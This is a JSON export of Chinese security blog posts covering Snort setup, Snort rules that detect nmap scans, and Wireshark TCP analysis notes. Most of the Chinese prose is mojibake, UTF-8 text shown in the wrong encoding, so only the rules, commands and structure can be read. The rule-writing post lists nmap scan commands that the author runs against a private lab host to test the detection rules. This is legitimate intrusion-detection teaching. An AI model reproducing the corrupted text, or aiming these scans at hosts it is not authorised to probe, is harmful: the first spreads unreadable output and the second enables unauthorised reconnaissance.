ï¼Œé‡Œé¢å­˜æœ‰é»˜è®¤çš„é…ç½®æ–‡ä»¶ åœ¨/etc/snortè¿™ä¸ªæ–‡ä»¶å†…ï¼Œæœ‰å’Œ/usr/local/etc/snortç›¸åŒçš„ä¸œè¥¿ã€‚ç”¨æˆ·åœ¨ç¼–å†™è§„åˆ™çš„æ—¶å€™ï¼Œä¼šåœ¨/etc/snorté‡Œé¢æ·»åŠ rulesæ–‡ä»¶å¤¹ï¼Œè¿›è¡Œè§„åˆ™ç¼–å†™ã€‚ æ‰€ä»¥æˆ‘çš„ç†è§£ï¼Œè§„åˆ™ç¼–å†™çš„é€»è¾‘æ˜¯ï¼š/etc/snort æ˜¯å¤åˆ»äº†åŸæœ¬å®‰è£…æ—¶é»˜è®¤çš„é…ç½®ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šï¼Œè¿›è¡Œç”¨æˆ·çš„è§„åˆ™ç¼–å†™ã€‚ä¸è¦åœ¨åŸè·¯å¾„ä¸Šå»ä¿®æ”¹åŸé…ç½®ã€‚ ä¸è¿‡ä¹Ÿå¯èƒ½æ˜¯æˆ‘ï¼Œä¸å°å¿ƒå®‰è£…äº†ä¸¤æ¬¡ï¼Œåˆ†åˆ«åœ¨ä¸åŒçš„è·¯å¾„ã€æ‰‹åŠ¨ç‹—å¤´ã€‘ å‚è€ƒæ–‡ç« snortç»™å‡ºçš„å®˜æ–¹å®‰è£…æ–‡æ¡£ï¼šsnort3-3.1.31.0&#x2F;README.md snortå®˜ç½‘ Snort3å®‰è£…å’Œé…ç½® Linux ä¸Šæ­å»º Snort+BASE å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ ubuntuæ­å»ºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"snortç¼–å†™æ£€æµ‹nmapæ‰«æè§„åˆ™","slug":"snortç¼–å†™æ£€æµ‹nmapæ‰«æè§„åˆ™","date":"2022-07-16T16:52:17.000Z","updated":"2024-11-12T06:59:20.000Z","comments":true,"path":"2022/07/17/snortç¼–å†™æ£€æµ‹nmapæ‰«æè§„åˆ™/","permalink":"https://gryffinbit.top/2022/07/17/snort%E7%BC%96%E5%86%99%E6%A3%80%E6%B5%8Bnmap%E6%89%AB%E6%8F%8F%E8%A7%84%E5%88%99/","excerpt":"","text":"å‰è¨€ubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® snortçš„å®‰è£…è·³è½¬Blogï¼š ubuntuã€ARMæ¶æ„ã€‘ä¸‹å®‰è£…snort2.9ã€è™šæ‹Ÿæœºç‰ˆã€‘ ubuntuã€x86æ¶æ„ã€‘ä¸‹æ­å»ºsnort3ã€äº‘æœåŠ¡å™¨ç‰ˆã€‘ snortçš„æ–‡ä»¶ã€è§„åˆ™é…ç½®è·³è½¬Blogï¼š é…ç½®snortä»¥NIDSæ¨¡å¼è¿è¡Œã€ubuntu-ARM64ã€‘ snortå®šä¹‰å’Œä½¿ç”¨å˜é‡è·³è½¬Blogï¼š snortå®šä¹‰å’Œä½¿ç”¨å˜é‡ ç¯å¢ƒé…ç½®Ubuntu: Ubuntu 20.04.2 ARM64 ã€parallelè™šæ‹Ÿæœºã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœºã€‘ ubuntuæ“ä½œç”¨æˆ·ï¼šåœ¨parallelsæ™®é€šç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² snortç‰ˆæœ¬ï¼šsnort-2.9.20 daq-2.0.7ç‰ˆæœ¬ï¼šdaq-2.0.7 è§„åˆ™é›†ç‰ˆæœ¬ï¼š 29200 Tips: æ³¨æ„ï¼è§„åˆ™é›†å’Œsnortç‰ˆæœ¬è¦å¯¹åº”ä¸Šï¼Œå› ä¸ºä¸åŒç‰ˆæœ¬çš„å¯èƒ½ä¼šæœ‰ä¸€äº›æ–°è§„åˆ™ä¸èƒ½åŒ¹é…ä¸Šï¼Œå°±ä¸èƒ½é¡ºåˆ©è¿è¡Œã€‚å‚è€ƒå®˜ç½‘ï¼Œæ¯ä¸ªæ–°ç‰ˆæœ¬çš„è¯´æ˜ï¼ŒåŒ…æ‹¬è§„åˆ™é›†çš„è¯´æ˜ï¼š è§„åˆ™é›† ç‰ˆæœ¬è¯´æ˜ ubuntuæºï¼šä¸­ç§‘å¤§armæº è§„åˆ™ç¼–å†™æ–¹å¼1alert&lt;keyword&gt; tcp&lt;protocol&gt; ip port -&gt; ip port (msg:&quot;&quot;; dsize:0; sid:10000004;rev:1;) keywordï¼š alert æŠ¥è­¦ pass æ— è§† log è®°å½• activate-æŠ¥è­¦å¹¶ä¸”æ¿€æ´»å¦ä¸€æ¡dynamicè§„åˆ™ã€‚ dynamic-ä¿æŒç©ºé—²ç›´åˆ°è¢«ä¸€æ¡activateè§„åˆ™æ¿€æ´»ï¼Œè¢«æ¿€æ´»åå°±ä½œä¸ºä¸€æ¡logè§„åˆ™æ‰§è¡Œã€‚ protocolï¼ˆåŒ…åè®®ï¼‰ï¼š TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼Œä¼ è¾“å±‚ï¼Œé¢å‘è¿æ¥ï¼Œå¯é ä¼ è¾“ã€‚ç”¨äºæä¾›å¯é çš„é€šä¿¡æœåŠ¡ï¼‰ UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼Œä¼ è¾“å±‚ï¼Œé¢å‘æ— è¿æ¥ï¼Œä¸å¯é ä¼ è¾“ï¼‰ ICMPï¼ˆæ§åˆ¶æŠ¥æ–‡åè®®ï¼Œç½‘ç»œå±‚ï¼Œé¢å‘æ— è¿æ¥ã€‚ç”¨äºä¼ é€’æ§åˆ¶æ¶ˆæ¯ï¼Œå¦‚ç½‘ç»œæ˜¯å¦ç•…ã€ä¸»æœºæ˜¯å¦å¯è¾¾ï¼‰ IP IP PORTï¼š æºIPï¼ŒæºPORT -&gt; IP PORTï¼šç›®çš„IPï¼Œç›®æ ‡PORT ï¼ˆï¼‰æ‹¬å·é‡Œçš„å†…å®¹æ˜¯è§„åˆ™ä½“ï¼š msg:&quot;&lt;message text&gt;&quot; 12345 å‘Šè¯‰å¼•æ“å’Œæ—¥å¿—ç³»ç»ŸåŒ…åˆ°æ¥æ—¶æ‰“å°çš„ä¿¡æ¯* ``` reference:&lt;id system&gt;,&lt;id&gt;;[reference:&lt;id system&gt;,&lt;id&gt;;]; ç”¨è¿™ä¸ªå…³é”®å­—æ¥å¼•ç”¨å¤–éƒ¨çš„æ”»å‡»è¯†åˆ«ç³»ç»Ÿ gid:&lt;generator id&gt;; 12345 ç”¨æ¥æ ‡è¯†ç‰¹å®šè§„åˆ™æ—¶ï¼Œsnortçš„å“ªéƒ¨åˆ†æ”¶åˆ°äº†æ£€æµ‹* ``` sid:&lt;snort rules id&gt;; ç”¨æ¥è¯†åˆ«ä¸åŒçš„è§„åˆ™ rev:&lt;revision integer&gt;; 12345 ç”¨æ¥è¯†åˆ«Snortè§„åˆ™çš„ä¿®è®¢ç‰ˆ* ``` flags æ£€æŸ¥TCP flagsçš„å€¼ã€‚ è¿™ä¸ªè§„åˆ™æ£€æŸ¥tcpæ ‡å¿—ã€‚åœ¨snortä¸­æœ‰9ä¸ªæ ‡å¿—å˜é‡ï¼š 123456789F - FIN (LSB in TCP Flags byte)S - SYNR - RSTP - PSHA - ACKU - URG2 - Reserved bit 21 - Reserved bit 1 (MSB in TCP Flags byte)0 - No TCP Flags Set åœ¨è¿™äº›æ ‡å¿—ä¹‹é—´è¿˜å¯ä»¥ä½¿ç”¨é€»è¾‘æ“ä½œç¬¦ï¼š \\+ ALL flag, åŒ¹é…æ‰€æœ‰çš„æŒ‡å®šçš„æ ‡å¿—å¤–åŠ ä¸€ä¸ªæ ‡å¿—ã€‚ \\* ANY flag, åŒ¹é…æŒ‡å®šçš„ä»»ä½•ä¸€ä¸ªæ ‡å¿—ã€‚ ! NOT flag, å¦‚æœæŒ‡å®šçš„æ ‡å¿—ä¸åœ¨è¿™ä¸ªæ•°æ®åŒ…ä¸­å°±åŒ¹é…æˆåŠŸã€‚ ä¿ç•™ä½å¯ä»¥ç”¨æ¥æ£€æµ‹ä¸æ­£å¸¸è¡Œä¸ºï¼Œä¾‹å¦‚IPæ ˆæŒ‡çº¹æ”»å‡»æˆ–è€…å…¶ä»–å¯ç–‘çš„è¡Œä¸ºã€‚ classtype:&lt;class name&gt;; 12345 ç”¨æ¥ä½œè§„åˆ™åˆ†ç±»* ``` priority:&lt;priority integer&gt;; ç”¨æ¥æ ‡è¯†è§„åˆ™çš„ä¼˜å…ˆç­‰çº§ metadata:key1 value1; 1 metadata:key1 value1, key2 value2; 12345678910111213141516171819202122232425262728293031323334353637383940414243 ç”¨é”®å€¼å¯¹çš„å½¢å¼å»åµŒå¥—æˆ‘ä»¬çš„è§„åˆ™## NMAPå‡ ç§ä¸åŒçš„ç«¯å£æ‰«æç‰¹ç‚¹&gt; **TCP/IPä¸­ç«¯å£å»ºç«‹è¿æ¥çš„åŸåˆ™**&gt;&gt; TCPæä¾›å¯é è¿æ¥ï¼Œé‡‡ç”¨ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œå››æ¬¡æ¡æ‰‹æ–­å¼€è¿æ¥ã€‚&gt;&gt; * ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥&gt;&gt; ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202207122102027.png)&gt;&gt; 1. å®¢æˆ·ç«¯å‘é€SYNï¼Œè¯·æ±‚å»ºç«‹è¿æ¥&gt; 2. æœåŠ¡å™¨ç«¯æ”¶åˆ°SYNï¼Œå‘é€ACKç¡®è®¤ï¼ŒåŒæ—¶è‡ªå·±å‘é€ä¸€ä¸ªSYN&gt; 3. å®¢æˆ·ç«¯æ”¶åˆ°ACK+SYNï¼Œå›å¤ACKç¡®è®¤ï¼Œè¿æ¥å»ºç«‹å®Œæˆ&gt;&gt; * å››æ¬¡æ¡æ‰‹æ–­å¼€è¿æ¥&gt;&gt; ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202207122110907.png)&gt;&gt; 1. å®¢æˆ·ç«¯å‘é€FINï¼Œè¯·æ±‚é‡Šæ”¾è¿æ¥&gt; 2. æœåŠ¡å™¨ç«¯æ”¶åˆ°FINï¼Œå‘é€ACKç¡®è®¤&gt; 3. æœåŠ¡å™¨ç«¯å‘é€FINï¼Œå‘ŠçŸ¥é‡Šæ”¾è¿æ¥&gt; 4. å®¢æˆ·ç«¯æ”¶åˆ°FINï¼Œå‘é€ACK&gt;&gt; * TCP/IPéµå¾ªåŸåˆ™&gt;&gt; 1. å‘é€SYNï¼ŒLISTENç«¯å£å›å¤ACKï¼ŒCLOSEç«¯å£å›å¤RST&gt; 2. å‘é€RSTä¼šè¢«ç›´æ¥ä¸¢å¼ƒ&gt; 3. å‘é€ACKç»™LISTENç«¯å£ï¼Œå›å¤RST&gt; 4. å‘é€FINï¼ŒLISTENç«¯å£ä¸¢å¼ƒï¼ŒCLOSEç«¯å£å›å¤RST---**NMAPå…¨è¿æ¥æ‰«æTCP Connect scan**```shellnmap -sT å‘é€SYN å›å¤ACKåˆ™æ˜¯LISTENï¼Œå›å¤RSTæ˜¯CLOSE å›å¤ACK å®¹æ˜“è¢«å¯Ÿè§‰ åŠå¼€æ”¾SYNæ‰«æ TCP SYN Scan 1namp -sS å‘é€SYN å›å¤SYN+ACKåˆ™æ˜¯LISTEN å›å¤RSTåˆ™CLOSE åº”ç”¨ç¨‹åºæ²¡æœ‰æ—¥å¿— å®¹æ˜“è¢«å‘ç° ä»¥ä¸‹æ˜¯éšè”½æ‰«æ ACKæ‰«æ 1nmap -sA å‘é€ACK LISTENç«¯å£å›å¤RST CLOSEç«¯å£ä¸¢å¼ƒ FINæ‰«æ 1nmap -sF å‘é€FIN LISTENç«¯å£ä¸¢å¼ƒ CLOSEç«¯å£å›å¤RST æ‰«ææ•ˆç‡ä½ï¼Œéœ€è¦ç­‰å¾…è¶…æ—¶ TCP Xmasæ‰«æï¼ˆåŒFINï¼‰ 1nmap -sX å‘é€FIN+URG+PSH LISTENç«¯å£ä¸¢å¼ƒ CLOSEç«¯å£å›å¤RST æ‰«ææ•ˆç‡ä½ï¼Œéœ€è¦ç­‰å¾…è¶…æ—¶ï¼Œä¸èƒ½é€‚ç”¨æ‰€æœ‰ç³»ç»Ÿ TCP NULLæ‰«æï¼ˆåŒFINï¼‰ 1nmap -sN å‘é€NULL LISENç«¯å£ä¸¢å¼ƒ CLOSEç«¯å£å›å¤RST æ‰«ææ•ˆç‡ä½ï¼Œéœ€è¦ç­‰å¾…è¶…æ—¶ï¼Œä¸èƒ½é€‚ç”¨æ‰€æœ‰ç³»ç»Ÿ UDPæ‰«æ 1nmap -sU å‘é€UDPåŒ… è¿”å›ICMP_PORT_UNREACHä¸ºå…³é—­ï¼Œå¦åˆ™æ‰“å¼€ ä¸å¯é  ç›®æ ‡å¯ä»¥ç¦æ­¢UDP æ£€æµ‹NMAPæ‰«æç¼–å†™è§„åˆ™ åœ¨ipéƒ¨åˆ†å¡«å†™å®‰è£…snortæœºå™¨çš„ip 1sudo vim /etc/snort/rules/local.rules 1234567891011121314151617181920# NMAP Pingæ‰«æalert icmp any any -&gt; 192.168.1.6 any (msg: &quot;NMAP ping sweep Scan&quot;; dsize:0;sid:10000001; rev: 1;)# NMAP TCPæ‰«æ#ï¼ˆèƒ½å¤Ÿæ£€æµ‹åˆ°æ”»å‡»ä½¿ç”¨nmapçš„ç«¯å£çˆ†ç ´ã€è¿æ¥åŠæ¼æ´åˆ©ç”¨è¡Œä¸ºï¼‰alert tcp any any -&gt; 192.168.1.6 any (msg: &quot;NMAP TCP Scan&quot;;sid:10000002;rev:2;)# NMAP UDPæ‰«æ#ï¼ˆèƒ½å¤Ÿæ£€æµ‹åˆ°æ”»å‡»ä½¿ç”¨nmapçš„ç«¯å£çˆ†ç ´ã€è¿æ¥åŠæ¼æ´åˆ©ç”¨è¡Œä¸ºï¼‰ alert udp any any -&gt; 192.168.1.6 any ( msg:&quot;Nmap UDP Scan&quot;; sid:10000003; rev:1; )# NMAP XMASæ‰«æ# æœ‰æ—¶æ”»å‡»è€…ä¸é€‚ç”¨ TCP é€šè®¯è¿›è¡Œæ‰«æï¼Œè€Œä½¿ç”¨ XMAS é€šè¿‡ Finã€PSHå’ŒURGå‘é€æ•°æ®åŒ…è¿›è¡Œæ‰«æalert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap XMAS Tree Scan&quot;; flags:FPU; sid:1000004; rev:1; )# æ£€æµ‹FInæ‰«æalert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap FIN Scan&quot;; flags:F; sid:1000005; rev:1;)# æ£€æµ‹NULLæ‰«æalert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap NULL Scan&quot;; flags:0; sid:1000006; rev:1; ) TCP flagsçš„å€¼ F - FIN (LSB in TCP Flags byte)S - SYNR - RSTP - PSHA - ACKU - URG2 - Reserved bit 21 - Reserved bit 1 (MSB in TCP Flags byte)0 - No TCP Flags Set è§„åˆ™æ£€æµ‹ snortè™šæ‹Ÿæœºï¼Œå¼€å¯æ£€æµ‹æ¨¡å¼ 1snort -i eth0 -c /etc/snort/snort.conf -A fast -l /var/log/snort/ ç‰©ç†æœºï¼Œè¿›è¡Œæ”»å‡» -p1-200 åªæ‰«æ1-200ç«¯å£å· 1234567891011121314151617# Pingnmap -sP 192.168.1.6 --disable-arp-ping# TCPnmap -sT -p1-200 192.168.1.6# UDPnmap -sU -p1-200 192.168.1.6# XMASnmap -sX -p1-200 192.168.1.6# FINnmap -sF -p1-200 192.168.1.6# NULLnmap -sN -p1-200 192.168.1.6 åœ¨æ—¥å¿—ä¸­æŸ¥çœ‹æ£€æµ‹ç»“æœ 12345cd /var/log/snortcat alert# æˆ–è€…å¯ä»¥æŸ¥çœ‹æ—¥å¿—sudo snort -r snort.log.xxx# æˆ–è€…å¯ä»¥wiresharkæŸ¥çœ‹ â€‹ å‚è€ƒæ–‡ç« æ£€æµ‹NAMPæ‰«æ nmapæ‰«æç«¯å£å¸¸ç”¨çš„å‡ ç§æ‰«ææ¨¡å¼","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"},{"name":"snortè§„åˆ™","slug":"snortè§„åˆ™","permalink":"https://gryffinbit.top/tags/snort%E8%A7%84%E5%88%99/"}],"author":"Gryffinbit"},{"title":"wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€å·¥ä½œä¸­çš„Wiresharkã€‘","slug":"wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€å·¥ä½œä¸­çš„Wiresharkã€‘","date":"2022-07-15T15:37:18.000Z","updated":"2024-11-12T06:58:23.000Z","comments":true,"path":"2022/07/15/wiresharkç½‘ç»œåˆ†æçš„è‰ºæœ¯ç¬”è®°ã€å·¥ä½œä¸­çš„Wiresharkã€‘/","permalink":"https://gryffinbit.top/2022/07/15/wireshark%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E7%9A%84%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0%E3%80%90%E5%B7%A5%E4%BD%9C%E4%B8%AD%E7%9A%84Wireshark%E3%80%91/","excerpt":"","text":"wiresharkæŠ“å–åŒ…ï¼Œç†æƒ³å’Œç°å®ç†æƒ³ä¸­çš„TCPä¼ è¾“ï¼šå®¢æˆ·ç«¯æ¯ä¼ ä¸¤ä¸ªæ•°æ®åŒ…ï¼ŒæœåŠ¡å™¨å°±ç«‹å³Ackä¸€ä¸‹è¡¨ç¤ºå·²ç»æ”¶åˆ°ã€‚ ç„¶è€Œè¿™åªæ˜¯ä»æ•°æ®æ¥æ”¶æ–¹çš„è§’åº¦æ‰€çœ‹åˆ°çš„ã€‚ä½†å®é™…ä¸Šç½‘ç»œå­˜åœ¨å»¶è¿Ÿï¼ŒackåŒ…åˆ°è¾¾å®¢æˆ·ç«¯æ—¶ä¼šä¹‹åï¼Œå¯èƒ½ä¼šå­˜åœ¨å®¢æˆ·ç«¯å‘å®Œ6å·åŒ…æ‰æ”¶åˆ°ACK3ã€‚ æ‰€ä»¥æŠ“åŒ…æ—¶å¯ä»¥å°½é‡ä¸¤è¾¹åŒæ—¶æŠ“åŒ…ï¼Œå¯¹ç…§ç€çœ‹ã€‚ è®¡ç®—â€œåœ¨é€”å­—èŠ‚æ•°â€ åœ¨é€”å­—èŠ‚æ•°ï¼šç½‘ç»œæ‰¿è½½é‡ï¼Œå¯ä»¥ç”¨å·²ç»å‘é€å‡ºå»ï¼Œä½†å°šæœªè¢«ç¡®è®¤çš„å­—èŠ‚æ•°æ¥è¡¨ç¤ºã€‚åœ¨é€”å­—èŠ‚æ•°å¦‚æœè¶…è¿‡ç½‘ç»œçš„æ‰¿è½½èƒ½åŠ›ï¼Œå°±ä¼šä¸¢åŒ…é‡ä¼  ç†æƒ³æƒ…å†µï¼šç½‘ç»œä¸Šåªæœ‰ä¸€ä¸ªTCPè¿æ¥åœ¨é€šä¿¡ï¼Œå¯ä»¥é€šè¿‡å¸¦å®½å’Œå»¶è¿Ÿæ¥è®¡ç®—æœ€å¤šèƒ½æ‰¿è½½å¤šå°‘åœ¨é€”å­—èŠ‚æ•°ã€‚ å®é™…ç¯å¢ƒï¼š â€‹ åŒä¸€æ¡ç½‘ç»œè·¯å¾„æ˜¯ç”±å¤šå°ä¸»æœºä¹‹é—´å…±äº«çš„ï¼Œæ ¹æœ¬ä¸çŸ¥é“å¤šå°‘æ¯”ä¾‹çš„å¸¦å®½æ˜¯åˆ†é…ç»™æŸä¸ªTCPè¿æ¥ã€‚ ä½¿ç”¨Wiresharkåˆ†æï¼š 1åœ¨é€”å­—èŠ‚æ•°=seq+len-ack â€‹ seqå’Œlenæ˜¯æ¥è‡ªä¸Šä¸€ä¸ªæ•°æ®å‘é€æ–¹çš„åŒ…ï¼Œackæ¥è‡ªä¸Šä¸€ä¸ªæ•°æ®æ¥æ”¶æ–¹çš„åŒ…ã€‚ã€åœ¨æ•°æ®å‘é€æ–¹æŠ“åˆ°çš„åŒ…ï¼Œæ‰èƒ½ç”¨æ¥åˆ†æåœ¨é€”å­—èŠ‚æ•°ã€‘ ä¼°ç®—ç½‘ç»œæ‹¥å¡ç‚¹ ç½‘ç»œæ‹¥å¡ç‚¹ï¼šå½“å‘é€æ–¹ä¸€å£æ°”å‘ç½‘ç»œä¸­æ³¨å…¥å¤§é‡æ•°æ®æ—¶ï¼Œå°±å¯èƒ½è¶…è¿‡è¯¥ç½‘ç»œçš„æ‰¿å—èƒ½åŠ›è€Œå¯¼è‡´æ‹¥å¡ï¼Œè¿™ä¸ªè¶³ä»¥è§¦å‘æ‹¥å¡çš„æ•°æ®é‡å°±ç§°ä¸ºæ‹¥å¡ç‚¹ å‘ç”Ÿæ‹¥å¡æ—¶çš„åœ¨é€”å­—èŠ‚æ•°å³æ˜¯è¯¥æ—¶åˆ»çš„ç½‘ç»œæ‹¥å¡ç‚¹ã€‚ä¼°ç®—æ‹¥å¡ç‚¹å¯ä»¥ç®€åŒ–æˆï¼šæ‰¾å‡ºæ‹¥å¡æ—¶åˆ»çš„åœ¨é€”å­—èŠ‚æ•° æ‹¥å¡çš„ç‰¹å¾æ˜¯è¿ä¸²ä¸¢åŒ…ï¼Œä¸¢åŒ…ä¹‹åå°±ä¼šé‡ä¼ ï¼Œè€Œ Wireshark æ˜¯èƒ½å¤Ÿæ ‡è¯†å‡ºé‡ä¼ åŒ…çš„ã€‚ å¯»æ‰¾æ‹¥å¡æ—¶åˆ»æ­¥éª¤ï¼šå…ˆä»Wiresharkä¸­æ‰¾åˆ°ä¸€è¿ä¸²é‡ä¼ åŒ…ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œåœ¨æ ¹æ®è¯¥é‡ä¼ åŒ…çš„seqå€¼æ‰¾åˆ°å…¶åŸå§‹åŒ…ï¼Œæœ€åè®¡ç®—è¯¥åŸå§‹åŒ…å‘é€æ—¶åˆ»çš„åœ¨é€”å­—èŠ‚æ•°ã€‚ åœ¨wiresharkä¸Šå•å‡»analyzeèœå•ï¼Œé€‰æ‹©expert infoé€‰é¡¹ï¼Œæ‰¾åˆ°é‡ä¼ ç»Ÿè®¡è¡¨ ç‚¹å‡»ç¬¬ä¸€ä¸ªé‡ä¼ åŒ…No.1225.å¯è§å®ƒçš„seq&#x3D;1012852.äºæ˜¯ç”¨tcp.seq==1012852ä½œä¸ºè¿‡æ»¤æ¡ä»¶ ç‚¹å‡»applyè¿‡æ»¤ä¹‹åå¾—åˆ°äº†åŸå§‹åŒ…No.1053 é€‰å®š1053 å·åŒ…ï¼Œç„¶åç‚¹å‡»Clear æ¸…é™¤è¿‡æ»¤ã€‚å¯è§ä¸Šä¸€ä¸ªæ¥è‡ªæœåŠ¡å™¨ç«¯çš„åŒ…æ˜¯1051 å·åŒ…ã€‚ åˆ©ç”¨ä¸Šæ–‡è®¡ç®—â€œåœ¨é€”å­—èŠ‚æ•°â€çš„å…¬å¼ï¼Œå¯çŸ¥å½“æ—¶çš„åœ¨é€”å­—èŠ‚æ•°ä¸º1012852ï¼ˆNo.1053 çš„Seqï¼‰+816ï¼ˆNo.1053 çš„Lenï¼‰âˆ’ 910546ï¼ˆNo.1051 Ackï¼‰&#x3D;103122å­—èŠ‚ã€‚ æœ€å¥½å¤šæ¬¡é‡‡æ ·ï¼Œç„¶åé€‰å®šä¸€ä¸ªåˆé€‚çš„å€¼ä½œä¸ºè¯¥è¿æ¥çš„æ‹¥å¡ç‚¹ï¼ˆä¸åº”è¯¥å–å¹³å‡å€¼ï¼Œè€Œåº”è¯¥å–ä¸€ä¸ªåå°çš„ï¼‰ã€‚ LSOLSO æ˜¯ä»€ä¹ˆå‘¢?å®ƒæ˜¯ä¸ºäº†æ‹¯æ•‘ CPU è€Œå‡ºç°çš„ä¸€ä¸ªåˆ›æ„ã€‚éšç€ç½‘ç»œè¿›å…¥åƒå…†å’Œä¸‡å…†æ—¶ä»£ï¼ŒCPUçš„å·¥ä½œè´Ÿæ‹…æ˜æ˜¾åŠ é‡äº†ã€‚625MB&#x2F;s çš„ç½‘ç»œæµé‡å¤§çº¦éœ€è¦è€—è´¹5 GHz çš„CPUï¼Œè¿™å·²ç»éœ€è¦ä¸€ä¸ªåŒæ ¸2.5 GHz CPUçš„å…¨éƒ¨å¤„ç†èƒ½åŠ›äº†ã€‚ä¸ºäº†ç¼“è§£CPU çš„å‹åŠ›ï¼Œæœ€å¥½æŠŠå®ƒçš„ä¸€äº›å·¥ä½œå¤–åŒ…(offload)ç»™ç½‘å¡ï¼Œæ¯”å¦‚ TCP çš„åˆ†æ®µå·¥ä½œã€‚ ä¼ ç»Ÿçš„ç½‘ç»œå·¥ä½œæ–¹å¼æ˜¯è¿™æ ·çš„:åº”ç”¨å±‚æŠŠäº§ç”Ÿçš„æ•°æ®äº¤ç»™ TCP å±‚ï¼ŒTCP å±‚å† æ ¹æ® MSS å¤§å°è¿›è¡Œåˆ†æ®µ(ç”± CPU è´Ÿè´£)ï¼Œç„¶åå†äº¤ç»™ç½‘å¡ã€‚è€Œå¯ç”¨ LSO ä¹‹åï¼Œ TCP å±‚å°±å¯ä»¥æŠŠå¤§äº MSS çš„æ•°æ®å—ç›´æ¥ä¼ ç»™ç½‘å¡ï¼Œè®©ç½‘å¡æ¥è´Ÿè´£åˆ†æ®µå·¥ä½œäº†ã€‚ æ¯”å¦‚æœ¬ä¾‹å­ä¸­çš„â€œSeq&#x3D;348586ï¼ŒLen&#x3D;2776â€ï¼Œæœ€åä¼šè¢«ç½‘å¡åˆ†æˆâ€œSeq&#x3D;348586ï¼ŒLen&#x3D;1388â€å’Œâ€œSeq&#x3D;349974ï¼ŒLen&#x3D;1388â€ä¸¤ä¸ªåŒ…ã€‚ç”±äºåœ¨å‘é€æ–¹æŠ“åŒ…æ—¶ç›¸å½“äº ç«™åœ¨ CPU çš„è§†è§’ï¼Œæ‰€ä»¥çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªåˆ†æ®µå‰çš„å¤§åŒ…ã€‚å‡å¦‚æ˜¯åœ¨æ¥æ”¶æ–¹æŠ“åŒ…ï¼Œå°±æ˜¯ ç½‘å¡åˆ†æ®µåçš„ä¸¤ä¸ªå°åŒ…äº†ã€‚æœ¬æ–‡ç”¨åˆ°çš„è¿™ä¸ªä¾‹å­è¿˜æ˜¯æ¯”è¾ƒå°çš„æ•°æ®å—ï¼Œæˆ‘è¿˜ç»å¸¸æŠ“åˆ°æ¯”è¿™ä¸ªå¤§åå€ä»¥ä¸Šçš„ã€‚ ç†Ÿè¯»RFC RFC(Request For Comments)-æ„å³â€œè¯·æ±‚æ³¨è§£â€ï¼ŒåŒ…å«äº†å…³äºInternetçš„å‡ ä¹æ‰€æœ‰é‡è¦çš„æ–‡å­—èµ„æ–™ Questionï¼šä¸¢åŒ…ä¸å¤šï¼ŒRTT ä¹Ÿå¾ˆç¨³å®šï¼Œä½†æ•°æ®å´ä¼ ä¸å¿«ã€‚æ€ä¹ˆå›äº‹ Answerï¼šåˆæ­¥çŒœæµ‹æ˜¯å®¢æˆ·ç«¯çš„ TCP å‘é€çª—å£å¤ªå°ã€‚å†³å®šå®¢æˆ·ç«¯å‘é€çª—å£çš„å› ç´ æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«ä¸ºç½‘ç»œä¸Šçš„æ‹¥å¡çª—å£(Congestion Windowï¼Œç¼©å†™ä¸º cwnd)å’ŒæœåŠ¡å™¨ä¸Šçš„æ¥æ”¶çª—å£ã€‚ cwndçš„å¢é•¿æ–¹å¼ é€‰ä¸­ä¸€ä¸ªå‘é€çª—å£ ä¸­æœ€åçš„é‚£ä¸ªåŒ…ï¼Œå°±å¯ä»¥çœ‹åˆ°å®ƒçš„â€œBytes in flightâ€ï¼Œå®ƒåœ¨æœ¬æ¡ˆä¾‹ä¸­å°±ä»£è¡¨äº† cwnd çš„å¤§å°ã€‚æˆ‘éšæœºé€‰ä¸­äº† 1970 å·åŒ…ï¼Œä»å›¾ 4 å¯è§å…¶ cwnd ä¸º 76020ã€‚æ ¹æ®å›¾ 3 çš„ç† è®ºï¼Œå¦‚æœå½“æ—¶å¤„äºâ€œæ‹¥å¡é¿å…â€é˜¶æ®µï¼Œé‚£ä¸‹ä¸€ä¸ª cwnd åº”è¯¥å°±æ˜¯ 76020 åŠ ä¸Šä¸€ä¸ª MSS(ä»¥å¤ªç½‘ä¸­å¤§æ¦‚ä¸º 1460 